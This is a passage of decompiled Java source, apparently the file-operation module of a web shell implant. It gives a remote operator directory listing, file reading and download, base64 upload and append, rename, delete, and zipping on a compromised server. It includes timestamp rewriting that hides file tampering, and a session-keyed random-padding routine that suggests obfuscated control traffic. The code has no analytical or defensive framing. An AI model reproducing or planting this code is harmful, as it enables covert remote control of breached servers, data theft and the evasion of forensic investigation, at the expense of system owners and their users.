        objArr.add(warpFileObj(new File("..")));
        if (f.isDirectory() && f.listFiles() != null) {
            for (File temp : f.listFiles()) {
                objArr.add(warpFileObj(temp));
            }
        }
        String result = buildJsonArray(objArr, true);
        return result;
    }

    private String show() throws Exception {
        byte[] fileContent = getFileData(path);
        return base64encode(fileContent);
    }

    private byte[] getFileData(String path2) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        FileInputStream fis = new FileInputStream(new File(path2));
        while (true) {
            int data = fis.read();
            if (data != -1) {
                output.write(data);
            } else {
                fis.close();
                return output.toByteArray();
            }
        }
    }

    private String create() throws Exception {
        FileOutputStream fso = new FileOutputStream(path);
        fso.write(base64decode(content));
        fso.flush();
        fso.close();
        String result = path + "上传完成，远程文件大小:" + new File(path).length();
        return result;
    }

    private Map<String, String> renameFile() throws Exception {
        Map<String, String> result = new HashMap<>();
        File oldFile = new File(path);
        File newFile = new File(newPath);
        if (oldFile.exists() && (oldFile.isFile() & oldFile.renameTo(newFile))) {
            result.put("status", "success");
            result.put("msg", "重命名完成:" + newPath);
        } else {
            result.put("status", "fail");
            result.put("msg", "重命名失败:" + newPath);
        }
        return result;
    }

    private String createFile() throws Exception {
        FileOutputStream fso = new FileOutputStream(path);
        fso.close();
        String result = path + "创建完成";
        return result;
    }

    private String createDirectory() throws Exception {
        File dir = new File(path);
        dir.mkdirs();
        String result = path + "创建完成";
        return result;
    }

    private void download() throws Exception {
        FileInputStream fis = new FileInputStream(path);
        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
        Method write = so.getClass().getMethod("write", byte[].class);
        while (true) {
            int data = fis.read();
            if (data != -1) {
                write.invoke(so, Integer.valueOf(data));
            } else {
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                fis.close();
                return;
            }
        }
    }

    private String append() throws Exception {
        FileOutputStream fso = new FileOutputStream(path, true);
        fso.write(base64decode(content));
        fso.flush();
        fso.close();
        String result = path + "追加完成，远程文件大小:" + new File(path).length();
        return result;
    }

    private Map<String, String> delete() throws Exception {
        Map<String, String> result = new HashMap<>();
        File f = new File(path);
        if (f.exists()) {
            if (f.delete()) {
                result.put("status", "success");
                result.put("msg", path + " 删除成功.");
            } else {
                result.put("status", "fail");
                result.put("msg", "文件" + path + "存在，但是删除失败.");
            }
        } else {
            result.put("status", "fail");
            result.put("msg", "文件不存在.");
        }
        return result;
    }

    private String getTimeStamp() throws Exception {
        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File(path);
        Map<String, String> timeStampObj = new HashMap<>();
        if (f.exists()) {
            getClass();
            Class<?> cls = Class.forName("java.nio.file.Files");
            getClass();
            Class<?> cls2 = Class.forName("java.nio.file.attribute.BasicFileAttributes");
            getClass();
            Class<?> cls3 = Class.forName("java.nio.file.Paths");
            Object file = cls3.getMethod("get", String.class, String[].class).invoke(cls3.getClass(), path, new String[0]);
            Object attrs = cls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(cls, file, cls2, new LinkOption[0]);
            Class<?> cls4 = Class.forName("java.nio.file.attribute.FileTime");
            Object createTime = cls4.getMethod("toMillis", new Class[0]).invoke(cls2.getMethod("creationTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
            Object lastAccessTime = cls4.getMethod("toMillis", new Class[0]).invoke(cls2.getMethod("lastAccessTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
            Object lastModifiedTime = cls4.getMethod("toMillis", new Class[0]).invoke(cls2.getMethod("lastModifiedTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
            String createTimeStamp2 = df.format(new Date(((Long) createTime).longValue()));
            String lastAccessTimeStamp = df.format(new Date(((Long) lastAccessTime).longValue()));
            String lastModifiedTimeStamp = df.format(new Date(((Long) lastModifiedTime).longValue()));
            timeStampObj.put("createTime", createTimeStamp2);
            timeStampObj.put("lastAccessTime", lastAccessTimeStamp);
            timeStampObj.put("lastModifiedTime", lastModifiedTimeStamp);
            String result = buildJson(timeStampObj, true);
            return result;
        }
        throw new Exception("文件不存在");
    }

    private boolean isWindows() {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            return true;
        }
        return false;
    }

    private String updateTimeStamp() throws Exception {
        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File(path);
        if (f.exists()) {
            f.setLastModified(df.parse(modifyTimeStamp).getTime());
            if (!isOldJava()) {
                Class<?> cls = Class.forName("java.nio.file.Paths");
                Class<?> cls2 = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                Class<?> cls3 = Class.forName("java.nio.file.attribute.FileTime");
                Method getFileAttributeView = Class.forName("java.nio.file.Files").getMethod("getFileAttributeView", Path.class, Class.class, LinkOption[].class);
                Object attributes = getFileAttributeView.invoke(Class.forName("java.nio.file.Files"), cls.getMethod("get", String.class, String[].class).invoke(cls.getClass(), path, new String[0]), cls2, new LinkOption[0]);
                Object createTime = cls3.getMethod("fromMillis", Long.TYPE).invoke(cls3, Long.valueOf(df.parse(createTimeStamp).getTime()));
                Object accessTime = cls3.getMethod("fromMillis", Long.TYPE).invoke(cls3, Long.valueOf(df.parse(accessTimeStamp).getTime()));
                Object modifyTime = cls3.getMethod("fromMillis", Long.TYPE).invoke(cls3, Long.valueOf(df.parse(modifyTimeStamp).getTime()));
                cls2.getMethod("setTimes", cls3, cls3, cls3).invoke(attributes, modifyTime, accessTime, createTime);
            }
            return "时间戳修改成功。";
        }
        throw new Exception("文件不存在");
    }

    private String downloadPart(String path2, long blockIndex2, long blockSize2) throws Exception {
        int size;
        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path2);
        if (ch == null) {
            FileInputStream fis = new FileInputStream(path2);
            ch = fis.getChannel();
            sessionSetAttribute(this.Session, "fis", fis);
            sessionSetAttribute(this.Session, path2, ch);
        }
        ByteBuffer buffer = ByteBuffer.allocate((int) blockSize2);
        synchronized (ch) {
            ch.position(blockIndex2 * blockSize2);
            size = ch.read(buffer);
        }
        byte[] content2 = new byte[size];
        System.arraycopy(buffer.array(), 0, content2, 0, size);
        return base64encode(content2);
    }

    private static void zipFile(String srcDir, boolean KeepDirStructure) throws Exception {
        File file = new File(srcDir);
        String fileName = file.getName();
        FileOutputStream out = new FileOutputStream(new File(srcDir).getParentFile().getAbsolutePath() + File.separator + fileName + ".zip");
        System.currentTimeMillis();
        ZipOutputStream zos = null;
        try {
            try {
                zos = new ZipOutputStream(out);
                File sourceFile = new File(srcDir);
                compress(sourceFile, zos, sourceFile.getName(), KeepDirStructure);
                System.currentTimeMillis();
                if (zos != null) {
                    try {
                        zos.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            } catch (Exception e2) {
                throw new RuntimeException("zip error from ZipUtils", e2);
            }
        } catch (Throwable th) {
            if (zos != null) {
                try {
                    zos.close();
                } catch (IOException e3) {
                    e3.printStackTrace();
                }
            }
            throw th;
        }
    }

    private static void compress(File sourceFile, ZipOutputStream zos, String name, boolean KeepDirStructure) throws Exception {
        byte[] buf = new byte[102400];
        if (sourceFile.isFile()) {
            zos.putNextEntry(new ZipEntry(name));
            FileInputStream in = new FileInputStream(sourceFile);
            while (true) {
                int len = in.read(buf);
                if (len != -1) {
                    zos.write(buf, 0, len);
                } else {
                    zos.closeEntry();
                    in.close();
                    return;
                }
            }
        } else {
            File[] listFiles = sourceFile.listFiles();
            if (listFiles == null || listFiles.length == 0) {
                if (KeepDirStructure) {
                    zos.putNextEntry(new ZipEntry(name + "/"));
                    zos.closeEntry();
                    return;
                }
                return;
            }
            for (File file : listFiles) {
                if (KeepDirStructure) {
                    compress(file, zos, name + "/" + file.getName(), KeepDirStructure);
                } else {
                    compress(file, zos, file.getName(), KeepDirStructure);
                }
            }
        }
    }

    private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (Map<String, String> entity : list) {
            sb.append(buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("]");
        return sb.toString();
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class<?> cls = Class.forName("java.util.Base64");
                    Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] base64decode(String base64Text) throws Exception {
        byte[] result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            getClass();
            Class<?> cls = Class.forName("java.util.Base64");
            Object Decoder = cls.getMethod("getDecoder", null).invoke(cls, null);
            result = (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        } else {
            getClass();
            Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
            result = (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
        }
        return result;
    }

    private static String base64encode(String content2) throws Exception {
        String result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            Class<?> cls = Class.forName("java.util.Base64");
            Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
            result = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content2.getBytes("UTF-8"));
        } else {
            Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
            String result2 = (String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, content2.getBytes("UTF-8"));
            result = result2.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private static String base64encode(byte[] content2) throws Exception {
        String result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            Class<?> cls = Class.forName("java.util.Base64");
            Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
            result = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content2);
        } else {
            Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
            String result2 = (String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, content2);
            result = result2.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; i++) {
            buf[i] = (byte) random.nextInt(256);
        }
        return buf;
    }

    private Object sessionGetAttribute(Object session, String key) {
        Object result = null;
        try {
            result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        } catch (Exception e) {
        }
        return result;
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        } catch (Exception e) {
        }
    }
}
